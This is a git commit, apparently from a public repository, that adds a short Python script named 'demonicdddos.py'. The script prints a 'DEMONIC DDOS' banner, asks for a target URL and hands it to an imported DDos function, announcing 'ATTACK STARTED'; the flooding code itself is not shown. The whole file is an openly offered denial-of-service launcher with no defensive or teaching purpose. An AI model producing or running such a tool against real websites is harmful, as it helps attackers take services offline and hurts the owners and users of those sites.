103bbb6cdbd6940b81a70484a936d4c640905c08
codewithvansh <96611499+codewithvansh@users.noreply.github.com>
2024-12-17 11:01:39 +0530

    Add files via upload

---
+++ demonicdddos.py
@@ -0,0 +1,18 @@
+import os,sys,time
+from DDos import checkUrl,DDos
+from cfonts import render,say
+logo = render('DEMONIC DDOS',colors=["White","black"],align="center")
+
+os.system("clear")
+print(logo)
+print("_"*55)
+
+while True:
+    url = input("Enter Url :")
+    if checkUrl(url):
+        break
+    else:
+        print("Url isn't formented correctly.")
+
+print("ATTACK STARTED CTRL + C to STOP")
+DDos(url)
